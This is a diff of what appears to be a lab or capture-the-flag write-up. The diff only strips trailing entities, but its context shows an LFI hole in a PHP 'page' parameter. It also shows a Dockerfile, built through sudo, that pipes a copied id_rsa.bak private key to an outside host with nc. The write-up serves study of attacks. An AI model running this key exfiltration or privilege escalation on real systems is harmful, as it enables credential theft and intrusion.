@@ -98,7 +98,7 @@ else{
 ?>
 ```
 
-There was a deserialisation exploit here beacuse of how the `page` parameter is handled, which allows for LFI and execution of PHP files through the `include()` function. At least we know that this site is vulnerable.&#x20;
+There was a deserialisation exploit here beacuse of how the `page` parameter is handled, which allows for LFI and execution of PHP files through the `include()` function. At least we know that this site is vulnerable.
 
 The `site` directory contained Apache config files:
 
@@ -265,7 +265,7 @@ COPY id_rsa.bak /tmp/id_rsa.bak
 RUN cat /tmp/id_rsa.bak | nc 192.168.45.196 21
 ```
 
-Then, we can run `sudo /usr/bin/docker build .` within `/opt` where the `Dockerfile` is.&#x20;
+Then, we can run `sudo /usr/bin/docker build .` within `/opt` where the `Dockerfile` is.
 
 <figure><img src="../../../.gitbook/assets/image (2026).png" alt=""><figcaption></figcaption></figure>
 
